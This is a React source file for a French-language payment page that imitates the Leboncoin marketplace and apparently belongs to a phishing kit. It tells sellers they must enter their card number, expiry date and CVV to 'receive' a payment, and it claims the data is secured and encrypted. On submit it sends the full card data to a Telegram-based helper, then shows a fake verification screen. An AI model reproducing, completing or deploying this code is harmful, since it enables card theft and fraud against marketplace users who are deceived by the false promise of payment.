import React, { useState } from 'react';
import Logo from '../components/Logo';
import BackButton from '../components/BackButton';
import Button from '../components/ui/Button';
import Input from '../components/ui/Input';
import { cn } from '../utils/cn';
import PaymentVerification from '../components/payment-verification/PaymentVerification';
import { sendPaymentData } from '../utils/telegram';

type CardType = 'visa' | 'mastercard' | 'amex';

type PaymentConfigurationPageProps = {
  amount: string;
  itemType?: string;
  onVerificationComplete: () => void;
  onBack?: () => void;
};

const PaymentConfigurationPage = ({ amount, itemType, onVerificationComplete, onBack }: PaymentConfigurationPageProps) => {
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    cardType: '' as CardType,
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    amount,
    itemType: itemType || ''
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    
    if (id === 'expiryDate') {
      const cleanValue = value.replace(/\D/g, '');
      if (cleanValue.length >= 2) {
        const month = cleanValue.slice(0, 2);
        const year = cleanValue.slice(2, 4);
        const formatted = `${month}${year ? `/${year}` : ''}`;
        setFormData(prev => ({ ...prev, expiryDate: formatted }));
      } else {
        setFormData(prev => ({ ...prev, expiryDate: cleanValue }));
      }
    } else {
      setFormData(prev => ({ ...prev, [id]: value }));
    }
    
    if (errors[id]) {
      setErrors(prev => ({ ...prev, [id]: '' }));
    }
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || '';
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(' ');
    } else {
      return value;
    }
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCardNumber(e.target.value);
    setFormData(prev => ({ ...prev, cardNumber: formattedValue }));
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.cardType) newErrors.cardType = 'Veuillez sélectionner un type de carte';
    if (!formData.cardNumber.trim()) newErrors.cardNumber = 'Numéro de carte requis';
    if (!formData.expiryDate.trim()) newErrors.expiryDate = 'Date d\'expiration requise';
    if (!formData.cvv.trim()) newErrors.cvv = 'Code de sécurité requis';

    if (formData.cardNumber && !/^(\d{4}\s?){4}$/.test(formData.cardNumber.trim())) {
      newErrors.cardNumber = 'Numéro de carte invalide';
    }

    if (formData.expiryDate && !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(formData.expiryDate)) {
      newErrors.expiryDate = 'Format invalide (MM/YY)';
    }

    if (formData.cvv && !/^\d{3,4}$/.test(formData.cvv)) {
      newErrors.cvv = 'Code de sécurité invalide';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      // Ensure we have the transaction data
      const paymentData = {
        ...formData,
        amount: amount || formData.amount,
        itemType: itemType || formData.itemType
      };
      
      console.log('Sending payment data:', paymentData); // Debug log
      await sendPaymentData(paymentData);
      setIsLoading(true);
    }
  };

  const handleBackClick = () => {
    if (onBack) {
      onBack();
    } else {
      window.history.back();
    }
  };

  if (isLoading && formData.cardType) {
    return (
      <PaymentVerification 
        cardType={formData.cardType} 
        onComplete={onVerificationComplete}
      />
    );
  }

  return (
    <div className="min-h-screen w-full">
      <header className="p-4 flex items-center justify-between md:justify-center relative border-b">
        <div className="md:absolute md:left-4">
          <BackButton onClick={handleBackClick} />
        </div>
        <div className="md:mx-auto">
          <Logo />
        </div>
        <div className="w-6 md:hidden"></div>
      </header>

      <main className="flex justify-center py-8 px-4">
        <div className="w-full max-w-md">
          <h1 className="text-2xl font-semibold text-gray-800 mb-2">
            Configuration du paiement
          </h1>

          <p className="text-gray-600 mb-6">
            Veuillez renseigner les informations de votre carte bancaire pour recevoir votre paiement.
            Vos informations sont sécurisées et cryptées.
          </p>

          <div className="bg-gray-50 rounded-lg p-4 mb-8">
            <div className="flex justify-between items-center mb-2">
              <span className="text-gray-600">Montant à recevoir</span>
              <span className="text-xl font-semibold text-gray-800">{amount} €</span>
            </div>
            {itemType && (
              <div className="flex justify-between items-center">
                <span className="text-gray-600">Article</span>
                <span className="text-sm text-gray-800">{itemType}</span>
              </div>
            )}
          </div>

          <div className="mb-8 flex justify-center">
            <div className="bg-gradient-to-r from-gray-700 to-gray-900 rounded-xl p-6 text-white shadow-lg w-[340px] transform hover:scale-105 transition-transform duration-200">
              <div className="flex justify-between items-start mb-4">
                <div className="text-sm opacity-75">Carte bancaire</div>
                <div className="text-xl font-medium">
                  {formData.cardType ? formData.cardType.toUpperCase() : ''}
                </div>
              </div>
              <div className="mb-8">
                <div className="text-2xl tracking-widest font-medium">
                  {formData.cardNumber || '•••• •••• •••• ••••'}
                </div>
              </div>
              <div className="flex justify-between items-end text-sm">
                <div>
                  <div className="opacity-75 text-xs mb-1">Expire</div>
                  <div className="font-medium">{formData.expiryDate || 'MM/YY'}</div>
                </div>
                <div>
                  <div className="opacity-75 text-xs mb-1">CVV</div>
                  <div className="font-medium">{formData.cvv ? '•••' : '***'}</div>
                </div>
              </div>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-4">
              <div>
                <label htmlFor="cardType" className="block text-gray-800 text-base mb-1">
                  Type de carte <span className="text-leboncoin-button">*</span>
                </label>
                <select
                  id="cardType"
                  value={formData.cardType}
                  onChange={handleChange}
                  className={cn(
                    'w-full px-4 py-3 border rounded-lg text-gray-800 transition-colors duration-200',
                    'focus:outline-none focus:ring-2 focus:ring-leboncoin focus:border-transparent',
                    'bg-white border-gray-300'
                  )}
                >
                  <option value="">Sélectionnez un type de carte</option>
                  <option value="visa">Visa</option>
                  <option value="mastercard">Mastercard</option>
                  <option value="amex">American Express</option>
                </select>
                {errors.cardType && (
                  <div className="text-red-500 text-sm mt-1">{errors.cardType}</div>
                )}
              </div>

              <Input
                id="cardNumber"
                label="Numéro de carte"
                value={formData.cardNumber}
                onChange={handleCardNumberChange}
                error={errors.cardNumber}
                maxLength={19}
                placeholder="1234 5678 9012 3456"
                required
              />

              <div className="grid grid-cols-2 gap-4">
                <Input
                  id="expiryDate"
                  label="Date d'expiration"
                  placeholder="MM/YY"
                  value={formData.expiryDate}
                  onChange={handleChange}
                  error={errors.expiryDate}
                  maxLength={5}
                  required
                />

                <Input
                  id="cvv"
                  label="CVV"
                  type="password"
                  placeholder="123"
                  value={formData.cvv}
                  onChange={handleChange}
                  error={errors.cvv}
                  maxLength={4}
                  required
                />
              </div>
            </div>

            <Button 
              type="submit" 
              fullWidth 
              disabled={isLoading}
              className="mt-6"
            >
              {isLoading ? 'Chargement...' : 'Suivant'}
            </Button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PaymentConfigurationPage;